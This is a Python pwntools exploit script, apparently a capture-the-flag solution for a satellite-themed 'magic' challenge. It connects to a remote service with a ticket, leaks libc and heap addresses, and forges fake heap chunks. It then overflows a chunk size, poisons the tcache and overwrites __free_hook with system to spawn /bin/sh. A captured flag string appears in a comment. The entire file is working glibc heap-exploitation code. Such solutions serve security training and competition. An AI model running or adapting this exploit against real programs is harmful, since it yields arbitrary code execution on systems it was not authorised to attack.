#!/usr/bin/env python3
import struct

from pwn import *


def connect():
    if args.LOCAL:
        tube = gdb.debug(["magic_public/challenge/magic"], api=True)
    else:
        tube = remote("magic.quals2023-kah5Aiv9.satellitesabove.me", 5300)
        tube.sendlineafter(
            b"Ticket please:\n",
            b"ticket{oscar513629lima4:GPoMhQS_6l9ZH7wKNLn2YyA4sZxI15HzqlOJa8PDPwp3oFmjwONZvhlRkfpbMrZU7w}",
        )
    return tube


PREV_IN_USE = 1
TEST_MSG = 100


def post_message(tube, pipe_id, is_hex, msg):
    tube.sendlineafter(b"\n> ", b"1")  # 1: Post message on bus
    tube.sendlineafter(b"msg_id: ", str(TEST_MSG).encode())
    tube.sendlineafter(b"pipe_id: ", str(pipe_id).encode())
    tube.sendlineafter(b"hex: ", b"1" if is_hex else b"0")
    tube.sendlineafter(b"Message to post on bus: ", msg)


def handle(tube, command):
    tube.sendlineafter(b"\n> ", command)
    line = tube.recvline()
    assert line == b"\n"
    line = tube.recvline()
    if line == b"StarTracker: Testing Message\n":
        return bytearray(int(hex_b, 16) for hex_b in tube.recvline().split())
    elif line == b"1: Post message on bus\n":
        tube.unrecv(line)
        return None
    else:
        assert False, line


def handle_1(tube):
    return handle(tube, b"2")  # 2: Handle startracker 1 messages


def handle_2(tube):
    return handle(tube, b"3")  # 3: Handle startracker 2 messages


def main():
    with connect() as tube:

        def show_heap():
            if args.LOCAL:
                tube.gdb.interrupt_and_wait()
                print(tube.gdb.execute("heap chunks", to_string=True))
                print(tube.gdb.execute("heap bins", to_string=True))
                tube.gdb.continue_nowait()

        if args.LOCAL:
            tube.gdb.execute("c")

        tube.recvuntil(b"startracker 1 pipe_id: ")
        pipe1_id = int(tube.recvline())
        tube.recvuntil(b"startracker 2 pipe_id: ")
        pipe2_id = int(tube.recvline())

        # Leak libc and heap.
        post_message(tube, pipe1_id, True, b"0" * 11111)
        post_message(tube, pipe2_id, True, b"1" * 1000)
        leak = handle_1(tube)
        (libc_leak,) = struct.unpack("<Q", leak[0x1610:0x1618])
        (heap_leak,) = struct.unpack("<Q", leak[0x15D0:0x15D8])
        libc_base = libc_leak - 0x1ECBE0
        print(f"libc_base = 0x{libc_base:x}")
        assert libc_base & 0xFFF == 0
        print(f"heap_leak = 0x{heap_leak:x}")
        handle_2(tube)

        print("=== Prevent 0x30 chunks from appearing between A, B and C ===")
        for _ in range(2):
            post_message(tube, pipe1_id, False, b"\x66" * 0x28)
        for _ in range(2):
            handle_1(tube)

        chunk_size = 0x120
        overhead = 8
        alloc_size = chunk_size - overhead
        reduced_chunk_size = 0x100
        reduced_alloc_size = reduced_chunk_size - overhead

        print("=== Prevent B from being freed into tcache ===")
        for _ in range(7):
            post_message(tube, pipe1_id, False, b"\x66" * reduced_alloc_size)
        for _ in range(7):
            handle_1(tube)

        print("=== Allocate consecutive A, B and C ===")
        post_message(tube, pipe1_id, False, b"\xAA" * alloc_size)
        post_message(
            tube,
            pipe1_id,
            False,
            flat(
                {
                    # fd=C.fake, bk=C.fake
                    0xF8: struct.pack(
                        "<QQQ", 0x40 | PREV_IN_USE, heap_leak + 0x250, heap_leak + 0x250
                    ),
                },
                length=alloc_size,
                filler=(0xBB,),
            ),
        )
        post_message(
            tube,
            pipe1_id,
            False,
            flat(
                {
                    # prev_size, !PREV_IN_USE, fd=B.fake, bk=B.fake
                    0x10: struct.pack(
                        "<QQQQ", 0x40, 0x100, heap_leak + 0x210, heap_leak + 0x210
                    ),
                },
                length=alloc_size,
                filler=(0xCC,),
            ),
        )
        show_heap()

        print("=== Reduce B's size by overflowing A ===")
        handle_1(tube)
        post_message(
            tube,
            pipe1_id,
            True,
            b"A" * (alloc_size * 2) + f"{PREV_IN_USE:x}".encode(),
        )
        show_heap()

        print("=== Prepare a chunk that will precede C in tcache ===")
        post_message(tube, pipe2_id, False, b"\xDD" * alloc_size)

        print("=== Free B so that it's coalesced with the fake chunk ===")
        handle_1(tube)
        show_heap()

        print("=== Free C into tcache ===")
        handle_2(tube)
        handle_1(tube)
        show_heap()

        print("=== Allocate coalesced B and overwrite C's tcache link ===")
        free_hook = libc_base + 0x1EEE48
        post_message(
            tube,
            pipe1_id,
            False,
            flat(
                {
                    0x118: struct.pack("<QQ", 0x120 | PREV_IN_USE, free_hook),
                },
                length=0x138,
                filler=(0xBB,),
            ),
        )
        show_heap()

        print("=== Pop C from tcache ===")
        post_message(tube, pipe1_id, False, b"\xAA" * 0x118)
        show_heap()

        print("=== Overwrite free_hook ===")
        post_message(
            tube,
            pipe1_id,
            False,
            flat(
                {
                    0: struct.pack("<Q", libc_base + 0x52290),  # system
                },
                length=0x118,
                filler=(0x00,),
            ),
        )

        print("=== PWN ===")
        post_message(tube, pipe2_id, False, b"/bin/sh\0")
        tube.sendlineafter(b"\n> ", b"3")

        # flag{oscar513629lima4:GBH2mq6SUcIZEGhTzCU_JlcUzshfNgocECHBMyDXd-i-4o2uZFXGMU4_BaivZdhm8iGVCwcSL2oNZ0GI8jDo58M}
        tube.interactive()


if __name__ == "__main__":
    main()
